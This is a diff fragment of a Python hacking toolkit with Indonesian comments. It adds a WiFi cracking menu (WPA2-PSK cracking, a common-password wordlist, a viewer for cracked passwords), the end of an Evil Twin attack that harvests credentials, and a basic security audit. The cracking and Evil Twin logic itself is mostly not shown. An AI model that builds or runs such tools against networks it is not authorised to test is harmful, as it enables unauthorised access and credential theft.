@@ -552,4 +552,169 @@ rsn_pairwise=CCMP
         subprocess.run(["pkill", "dnsmasq"])
         subprocess.run(["airmon-ng", "stop", "wlan0mon"])
         
-        print("✅ Evil Tw
+        print("✅ Evil Twin attack completed")
+        print("💡 Check logs for captured credentials")
+        
+    except Exception as e:
+        print(f"❌ Evil Twin attack failed: {e}")
+
+def create_custom_wordlist():
+    """Buat custom wordlist berdasarkan common passwords"""
+    print("🔄 Creating custom wordlist...")
+    
+    common_passwords = [
+        "password", "password123", "admin", "admin123",
+        "12345678", "123456789", "1234567890", "qwerty",
+        "abc123", "password1", "12345", "1234",
+        "111111", "000000", "123123", "monkey",
+        "dragon", "sunshine", "princess", "letmein",
+        "welcome", "shadow", "master", "123qwe",
+        "654321", "superman", "1qaz2wsx", "password123",
+        "iloveyou", "football", "baseball", "whatever"
+    ]
+    
+    with open(f"{CRACK_LOG_DIR}/custom_wordlist.txt", "w") as f:
+        for pwd in common_passwords:
+            f.write(pwd + "\n")
+    
+    print("✅ Custom wordlist created!")
+
+def wifi_cracking_menu():
+    """Menu utama WiFi cracking"""
+    while True:
+        print("\n" + "=" * 60)
+        print("           ADVANCED WIFI CRACKING TOOLKIT")
+        print("=" * 60)
+        print("⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!")
+        print("=" * 60)
+        
+        print("\n🔧 MAIN MENU:")
+        print("1. 🔧 Setup Cracking Environment")
+        print("2. 📡 Advanced WiFi Scan")
+        print("3. 🔓 WPA2-PSK Cracking Toolkit")
+        print("4. 📊 View Cracked Passwords")
+        print("5. 🛡️  WiFi Security Audit")
+        print("6. 🏠 Back to Main Menu")
+        
+        try:
+            choice = input("\nSelect option (1-6): ").strip()
+            
+            if choice == "1":
+                setup_wifi_cracking()
+            elif choice == "2":
+                advanced_wifi_scan()
+            elif choice == "3":
+                wpa2_psk_crack()
+            elif choice == "4":
+                view_cracked_passwords()
+            elif choice == "5":
+                wifi_security_audit()
+            elif choice == "6":
+                break
+            else:
+                print("❌ Invalid selection")
+                
+        except KeyboardInterrupt:
+            print("\n\n⚠️  Returning to main menu...")
+            break
+        except Exception as e:
+            print(f"❌ Error: {e}")
+
+def view_cracked_passwords():
+    """Lihat password yang berhasil di-crack"""
+    cracked_file = f"{CRACK_LOG_DIR}/cracked_passwords.txt"
+    
+    if os.path.exists(cracked_file):
+        print(f"\n📋 CRACKED PASSWORDS:")
+        print("=" * 60)
+        with open(cracked_file, "r") as f:
+            content = f.read()
+            if content:
+                print(content)
+            else:
+                print("No passwords cracked yet")
+    else:
+        print("❌ No cracked passwords file found")
+
+def wifi_security_audit():
+    """Audit keamanan WiFi"""
+    print("\n🛡️  WIFI SECURITY AUDIT")
+    print("=" * 50)
+    
+    networks = advanced_wifi_scan()
+    if not networks:
+        return
+    
+    print("\n🔍 SECURITY ANALYSIS:")
+    
+    for net in networks[:10]:  # Analyze first 10 networks
+        security_issues = []
+        
+        # Check encryption
+        if 'WEP' in net['encryption']:
+            security_issues.append("❌ WEP - Easily crackable")
+        if 'WPA' in net['encryption'] and 'WPA2' not in net['encryption']:
+            security_issues.append("⚠️  WPA - Vulnerable to attacks")
+        if 'OPEN' in net['encryption']:
+            security_issues.append("🔓 OPEN - No security")
+        
+        # Check signal strength
+        try:
+            power = int(net['power'])
+            if power > -50:
+                security_issues.append("📡 Strong signal - More visible to attackers")
+        except:
+            pass
+        
+        # Check if hidden
+        if net['essid'] == 'Hidden':
+            security_issues.append("👻 Hidden SSID - Basic protection")
+        
+        # Display results
+        if security_issues:
+            print(f"\n📶 {net['essid']}:")
+            for issue in security_issues:
+                print(f"   {issue}")
+
+# Tambahkan menu ini ke main program utama
+def main():
+    """Menu utama program yang diperbarui"""
+    setup_logging()
+    
+    while True:
+        clear_screen()
+        display_header()
+        
+        print("\n📋 ADVANCED MAIN MENU:")
+        print("1. 🔗 Website Checker")
+        print("2. 🔤 Random String Generator") 
+        print("3. 📡 WiFi Checker & Tools")
+        print("4. 🔓 WiFi Cracking Toolkit")
+        print("5. 💻 System Information")
+        print("6. 🚀 System Setup & Requirements")
+        print("7. 🚪 Exit")
+        
+        try:
+            choice = input("\nSelect option (1-7): ").strip()
+            
+            if choice == "1":
+                website_checker()
+            elif choice == "2":
+                random_string_generator()
+            elif choice == "3":
+                wifi_checker()
+            elif choice == "4":
+                wifi_cracking_menu()
+            elif choice == "5":
+                show_detailed_system_info()
+            elif choice == "6":
+                system_setup_requirements()
+            elif choice == "7":
+                print("\n👋 Thank you for using the program!")
+                break
+            else:
+                print("❌ Invalid selection")
+                
+        except KeyboardInterrupt:
+            print("\n\n👋 Program terminated by user")
+            break
